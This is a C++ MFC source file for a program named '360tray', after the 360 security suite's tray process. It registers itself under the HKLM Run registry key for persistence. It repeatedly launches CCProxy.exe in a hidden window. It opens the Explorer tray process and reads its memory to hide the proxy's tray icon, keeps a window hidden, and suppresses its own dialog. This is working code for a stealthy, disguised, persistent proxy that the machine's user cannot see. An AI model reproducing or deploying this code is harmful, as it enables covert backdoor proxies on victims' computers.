// 360trayDlg.cpp : implementation file
//

#include "stdafx.h"
#include "360tray.h"
#include "360trayDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CMy360trayDlg dialog




CMy360trayDlg::CMy360trayDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMy360trayDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMy360trayDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CMy360trayDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &CMy360trayDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CMy360trayDlg message handlers

BOOL CMy360trayDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	CreateRun();
	AfxBeginThread(RunCCProxyThread,this);
	AfxBeginThread(RunHideThread,this);
	// TODO: Add extra initialization here

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMy360trayDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMy360trayDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMy360trayDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


UINT CMy360trayDlg::RunCCProxyThread(LPVOID lpParam)
{
	CMy360trayDlg* pDlg = (CMy360trayDlg*)lpParam;
	return pDlg->RunCCProxyMyThreadProc();
}



#define SYS_NT_4 0
#define SYS_95 1
#define SYS_98 2
#define SYS_ME 3
#define SYS_NT_2000 4
#define SYS_NT_XP 5
#define SYS_SERVER_2003 6
#define SYS_VISTA 7
#define SYS_NT_2008 8
#define SYS_NT_7 9
wstring GetSystemName(int* SystemType)
{

	SYSTEM_INFO info;                                   //用SYSTEM_INFO结构判断64位AMD处理器
	GetSystemInfo(&info);                               //调用GetSystemInfo函数填充结构
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX); 
	if(GetVersionEx((OSVERSIONINFO *)&os))                  
	{
		wstring vname;

		//下面根据版本信息判断操作系统名称

		switch(os.dwMajorVersion){                        //判断主版本号
case 4:
	switch(os.dwMinorVersion){                //判断次版本号
case 0:
	if(os.dwPlatformId==VER_PLATFORM_WIN32_NT)
	{
		vname=_T("Microsoft Windows NT 4.0");                //1996年7月发布
		*SystemType=SYS_NT_4 ;
	}
	else if(os.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
	{
		vname=_T("Microsoft Windows 95");
		*SystemType=SYS_95;

	}
	break;
case 10:
	{
		vname=_T("Microsoft Windows 98");
		*SystemType=SYS_98;
	}
	break;
case 90:
	{
		vname=_T("Microsoft Windows Me");
		*SystemType=SYS_ME;
	}
	break;
	}
	break;
case 5:
	switch(os.dwMinorVersion){               //再比较dwMinorVersion的值
case 0:
	{
		vname=_T("Microsoft Windows 2000");                    //1999年12月发布
		*SystemType=SYS_NT_2000;
	}
	break;
case 1:
	{
		vname=_T("Microsoft Windows XP");                    //2001年8月发布
		*SystemType=SYS_NT_XP;
	}
	break;
case 2:
	if(os.wProductType==VER_NT_WORKSTATION && 
		info.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)
	{
		vname=_T("Microsoft Windows XP Professional x64 Edition");
		*SystemType=SYS_NT_XP;
	}
	else if(GetSystemMetrics(SM_SERVERR2)==0)
	{
		vname=_T("Microsoft Windows Server 2003");        //2003年3月发布
		*SystemType=SYS_SERVER_2003;
	}
	else if(GetSystemMetrics(SM_SERVERR2)!=0)
	{
		vname=_T("Microsoft Windows Server 2003 R2");
		*SystemType=SYS_SERVER_2003;
	}
	break;
	}
	break;
case 6:
	switch(os.dwMinorVersion){
case 0:
	if(os.wProductType==VER_NT_WORKSTATION)
	{
		vname=_T("Microsoft Windows Vista");
		*SystemType=SYS_VISTA;
	}
	else
	{
		vname=_T("Microsoft Windows Server 2008");          //服务器版本
		*SystemType = SYS_NT_2008;
	}
	break;
case 1:
	if(os.wProductType==VER_NT_WORKSTATION)
	{
		vname=_T("Microsoft Windows 7");
		*SystemType=SYS_NT_7;
	}
	else
	{
		vname=_T("Microsoft Windows Server 2008 R2");
		*SystemType=SYS_NT_2008;
	}
	break;
	}
	break;
default:
	vname=_T("未知操作系统");
		}
		return vname;
	}
	else
		return _T("");

}



//void CWorkerThread::RunNTXP_2003(CTaskInfo* pTaskInfo,int nUseType)
void RunNTXP_2003()
{

	CString ModuleName;
	int ret = GetModuleFileName(NULL,ModuleName.GetBuffer(MAX_PATH),MAX_PATH);
	ModuleName.ReleaseBuffer(ret);
	int nPos = ModuleName.ReverseFind('\\');
	wstring szDestDirectory =  ModuleName.Left(nPos+1);
	SetCurrentDirectory(szDestDirectory.c_str());
	USES_CONVERSION;
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead,hWrite;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead,&hWrite,&sa,0)) {
		//MessageBox("Error On CreatePipe()");
		//g_Logger.Debug(__FILE__,__LINE__,_T("Error On CreatePipe()"));
		return ;
	}
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;


	// 	CString strDestFilePath = theApp.m_pConfig->m_DestFolde.c_str();
	// 	int nPos = strDestFilePath.ReverseFind(_T("."));
	// 	strDestFilePath = strDestFilePath.Left(nPos);
	// 	strDestFilePath.ReleaseBuffer();
	CString strDestFilePath;
	//strDestFilePath.Format(_T("%s\\%s\\%s.pdf"),theApp.m_pConfig->m_DestFolde.c_str(),pTaskInfo->m_strFileNameWithoutExt.c_str(),pTaskInfo->m_strFileNameWithoutExt.c_str());
	strDestFilePath.Format(_T("%s"),_T("CCProxy.exe"));

	CString strPararm;
//	strPararm.Format(_T("-f \"%s\" -d \"%s\" -t %d"),pTaskInfo->m_strFilePath.c_str(),strDestFilePath.GetBuffer(),nUseType);
	strPararm=_T("");
	//g_Logger.Debug(__FILE__,__LINE__,strPararm.GetBuffer());
	strPararm=L" " +strPararm;
	//log.WriteLog("参数 %s",W2A(strParam.c_str()));
	if (!CreateProcess(_T("CCProxy.exe"),(LPWSTR)strPararm.GetBuffer()
		,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)) {
			//MessageBox("Error on CreateProcess()");
			DWORD dwErr = GetLastError();
			//g_Logger.Error(__FILE__,__LINE__,_T("Error On CreateProcess(),%d"),dwErr);
			return ;
	}
	CloseHandle(hWrite);

	char buffer[4096] = {0};
	DWORD bytesRead;
	while (true) {
		if (ReadFile(hRead,buffer,4095,&bytesRead,NULL) == NULL)
			break;
		//m_Edit1 += buffer;
		//g_Logger.Debug(__FILE__,__LINE__,_T("buffer=%s"),A2W(buffer));
		//UpdateData(false);
		Sleep(200);
	}

	// 	m_contextPath = CsysPath::GetDirectoryName(file) + "\\" + CONTEXTTXTA;
	// 	if (_access(m_contextPath.c_str(),0)!=-1)
	// 	{
	// 		errType = ERR_SUCCESS;
	// 	}
	// 	else
	// 	{
	// 		errType = ERR_CONTEXT_CREATE_FAIL;
	// 	}
	WaitForSingleObject(pi.hProcess,INFINITE);
	CloseHandle(hRead);
	CloseHandle(pi.hThread);        
	CloseHandle(pi.hProcess); 
	Sleep(1000*1);
}

UINT CMy360trayDlg::RunCCProxyMyThreadProc()
{

 	while(TRUE)
 	{
 
 		//支持windows 2008 64bit
 		// 		if (bAutoRun)
 		//{
 
 			int SysType=0;
 			wstring strSysVersion = GetSystemName(&SysType);
 			USES_CONVERSION;
 //			g_Logger.Debug(__FILE__,__LINE__,_T("SysName=%s"),(strSysVersion.c_str()));
 			if (SysType==SYS_SERVER_2003||
 				SysType==SYS_NT_XP||
 				SysType==SYS_NT_2000)
 			{
 				RunNTXP_2003();//(pTaskInfo,nUseType);
 				//RunNTVista();
 			}
 			else
 			{
 				//RunNTVista();//(pTaskInfo,nUseType);
 			}
 
 		//}
	}
}


void ShowTrayIcon(TCHAR szIcon[],BOOL show) 

{ 

	HWND hWnd,hWndPaper; 

	unsigned long lngPID; 

	long ret,lngButtons; 

	HANDLE hProcess; 

	LPVOID lngAddress; 

	long lngTextAdr,lngHwndAdr,lngHwnd,lngButtonID; 

	char strBuff[1024]={0}; 

	TCHAR* str = NULL; 

	TCHAR *pp = NULL; 

	hWnd = FindWindow(_T("Shell_TrayWnd"), NULL); 

	hWnd = FindWindowEx(hWnd, 0, _T("TrayNotifyWnd"), NULL); 

	hWndPaper = FindWindowEx(hWnd, 0, _T("SysPager"), NULL); 

	if(!hWndPaper) 

		hWnd = FindWindowEx(hWnd, 0, _T("ToolbarWindow32"), NULL); 

	else 

		hWnd = FindWindowEx(hWndPaper, 0, _T("ToolbarWindow32"), NULL); 

	ret = GetWindowThreadProcessId(hWnd, &lngPID); 

	hProcess = OpenProcess(PROCESS_ALL_ACCESS 

		|PROCESS_VM_OPERATION 

		|PROCESS_VM_READ 

		|PROCESS_VM_WRITE, 

		0, 

		lngPID); 

	lngAddress = VirtualAllocEx(hProcess,0, 0x4096, MEM_COMMIT, PAGE_READWRITE); 

	lngButtons = SendMessage(hWnd, TB_BUTTONCOUNT, 0, 0); 

	for(int i=0 ;i< lngButtons - 1;i++) 

	{ 

		ret = SendMessage(hWnd,TB_GETBUTTON,i,long(lngAddress)); 

		ret = ReadProcessMemory(hProcess, LPVOID(long(lngAddress) + 16),&lngTextAdr,4,0); 

		if(lngTextAdr != -1) 

		{ 

			ret = ReadProcessMemory(hProcess, LPVOID(lngTextAdr),strBuff,1024,0);
			ret = ReadProcessMemory(hProcess, LPVOID(long(lngAddress) + 12), 

				&lngHwndAdr,4,0); 

			ret = ReadProcessMemory(hProcess, LPVOID(lngHwndAdr),&lngHwnd, 4, 

				0); 

			ret = ReadProcessMemory(hProcess, LPVOID(long(lngAddress) + 4),& 

				lngButtonID,4,0); 

			USES_CONVERSION; 

			str = OLE2T((LPOLESTR)(strBuff)); 

			pp=_tcsstr(str,szIcon); 

			if(pp != NULL) 

			{ 

				if(show) 

				{ 

					SendMessage(hWnd,TB_HIDEBUTTON,lngButtonID,0); 

				} 

				else 

				{ 

					SendMessage(hWnd,TB_HIDEBUTTON,lngButtonID,1); 

				} 

			} 

		} 

	} 

	VirtualFreeEx( hProcess,  lngAddress,  0X4096, MEM_RELEASE); 

	CloseHandle(hProcess); 

} 

void CMy360trayDlg::OnBnClickedOk()
{
	// TODO: Add your control notification handler code here
	//OnOK();

}


UINT CMy360trayDlg::RunHideThread(LPVOID lpParam)
{
	CMy360trayDlg* pDlg = (CMy360trayDlg*)lpParam;
	return pDlg->RunHideMyThreadProc();
}

UINT CMy360trayDlg::RunHideMyThreadProc()
{
	int i = 0;
	while(TRUE)
	{
		CString WindowCaption=_T("");
		CString strWindowCls;
		CString WindowCls = _T("Afx:00400000:0:00010011:00000000:00000000");
		if (!WindowCls)
			strWindowCls.Format(_T("%s"),_T(""));
		else
			strWindowCls.Format(_T("%s"),WindowCls);
		if (strWindowCls.IsEmpty())
		{
			TCHAR atomName[256];
			GetAtomName( (ATOM)MAKEINTATOM( 32770 ), atomName, 256 );
			strWindowCls.Format(_T("%s"),atomName);
		}

		HWND hwnd = ::FindWindow(strWindowCls,WindowCaption);
		if (hwnd)
		{
			//::SendMessage(hwnd,WM_CLOSE,0,0);
			::ShowWindow(hwnd,SW_HIDE);
			//g_Logger.Debug(__FILE__,__LINE__,_T("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!--------CloseWindows_pdf2SwfCrashDlg--------"));
		}


		ShowTrayIcon(_T("CCProxy"),FALSE);

// 		i++;
// 		if (i>=2000)
// 		{
// 			break;
// 		}
		Sleep(50);	
	}
	return 1;
}

/*************************************************************************
* The following overloading of DoModal() fixed a MFC bug that always 
* shows dialog even the window style is set to invisible in resource.
* We only turn on the fix in release mode.
* http://www.codeguru.com/forum/archive/index.php/t-109467.html
*************************************************************************/
// need these prototypes
BOOL AFXAPI AfxUnhookWindowCreate();
void AFXAPI AfxHookWindowCreate(CWnd* pWnd);
// and this define
#define DELETE_EXCEPTION(e)

int CMy360trayDlg::DoModal()
{
#ifdef _DEBUG
	return CDialog::DoModal();
#endif
	// can be constructed with a resource template or InitModalIndirect
	ASSERT(m_lpszTemplateName != NULL || m_hDialogTemplate != NULL ||
		m_lpDialogTemplate != NULL);

	// load resource as necessary
	LPCDLGTEMPLATE lpDialogTemplate = m_lpDialogTemplate;
	HGLOBAL hDialogTemplate = m_hDialogTemplate;
	HINSTANCE hInst = AfxGetResourceHandle();
	if (m_lpszTemplateName != NULL)
	{
		hInst = AfxFindResourceHandle(m_lpszTemplateName, RT_DIALOG);
		HRSRC hResource = ::FindResource(hInst, m_lpszTemplateName, RT_DIALOG);
		hDialogTemplate = LoadResource(hInst, hResource);
	}
	if (hDialogTemplate != NULL)
		lpDialogTemplate = (LPCDLGTEMPLATE)LockResource(hDialogTemplate);

	// return -1 in case of failure to load the dialog template resource
	if (lpDialogTemplate == NULL)
		return -1;

	// disable parent (before creating dialog)
	HWND hWndParent = PreModal();
	AfxUnhookWindowCreate();
	BOOL bEnableParent = FALSE;
	if (hWndParent != NULL && ::IsWindowEnabled(hWndParent))
	{
		::EnableWindow(hWndParent, FALSE);
		bEnableParent = TRUE;
	}

	TRY
	{
		// create modeless dialog
		AfxHookWindowCreate(this);
		if (CreateDlgIndirect(lpDialogTemplate,
			CWnd::FromHandle(hWndParent), hInst))
		{
			if (m_nFlags & WF_CONTINUEMODAL)
			{
				// enter modal loop
				DWORD dwFlags = MLF_SHOWONIDLE;
				dwFlags = ( ! (GetStyle() & WS_VISIBLE) ) ? 0 : MLF_SHOWONIDLE;
				if (GetStyle() & DS_NOIDLEMSG)
					dwFlags |= MLF_NOIDLEMSG;
				VERIFY(RunModalLoop(dwFlags) == m_nModalResult);
			}

			// hide the window before enabling the parent, etc.
			if (m_hWnd != NULL)
				SetWindowPos(NULL, 0, 0, 0, 0, SWP_HIDEWINDOW|
				SWP_NOSIZE|SWP_NOMOVE|SWP_NOACTIVATE|SWP_NOZORDER);
		}
	}
	CATCH_ALL(e)
	{
		DELETE_EXCEPTION(e);
		m_nModalResult = -1;
	}
	END_CATCH_ALL

		if (bEnableParent)
			::EnableWindow(hWndParent, TRUE);
	if (hWndParent != NULL && ::GetActiveWindow() == m_hWnd)
		::SetActiveWindow(hWndParent);

	// destroy modal window
	DestroyWindow();
	PostModal();

	// unlock/free resources as necessary
	if (m_lpszTemplateName != NULL || m_hDialogTemplate != NULL)
		UnlockResource(hDialogTemplate);
	if (m_lpszTemplateName != NULL)
		FreeResource(hDialogTemplate);

	return m_nModalResult;
}


int CMy360trayDlg::CreateRun(void)
{

	//添加以下代码
	HKEY   RegKey;   
	CString   sPath;   
	GetModuleFileName(NULL,sPath.GetBufferSetLength(MAX_PATH+1),MAX_PATH);   
	sPath.ReleaseBuffer();   
	int   nPos;   
	nPos=sPath.ReverseFind('\\');   
	sPath=sPath.Left(nPos);   
	CString   lpszFile=sPath+_T("\\360tray.exe");//这里加上你要查找的执行文件名称   
	CFileFind   fFind;   
	BOOL   bSuccess;   
	bSuccess=fFind.FindFile(lpszFile);   
	fFind.Close();   
	if(bSuccess)   
	{   
		CString   fullName;   
		fullName=lpszFile;   
		RegKey=NULL;   
		RegOpenKey(HKEY_LOCAL_MACHINE,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&RegKey);   
		//RegSetValueEx(RegKey,_T("360tray"),0,REG_SZ,(CONST BYTE *)(LPCTSTR)fullName,fullName.GetLength());//这里加上你需要在注册表中注册的内容   
		RegSetValueEx(RegKey,_T("360tray"),0,REG_SZ,(CONST BYTE *)fullName.GetBuffer(),fullName.GetLength()*2);//这里加上你需要在注册表中注册的内容   
		this->UpdateData(FALSE);   
	}   
	else   
	{   
		//theApp.SetMainSkin();   
		//::AfxMessageBox("没找到执行程序，自动运行失败");   
		exit(0);   
	}   
	return 0;
} 